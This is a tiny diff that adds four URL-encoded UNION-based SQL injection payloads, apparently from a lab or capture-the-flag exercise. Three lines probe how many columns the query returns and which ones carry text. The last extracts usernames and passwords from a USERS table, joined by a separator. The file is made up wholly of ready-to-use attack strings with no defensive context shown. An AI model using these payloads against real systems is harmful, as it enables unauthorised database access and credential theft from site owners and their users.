@@ -1,0 +1,4 @@
++UNION+SELECT+NULL,NULL--
++UNION+SELECT+'abc',NULL--
++UNION+SELECT+NULL,'bcd'--
++UNION+SELECT+NULL,username||'~'||password+FROM+USERS--
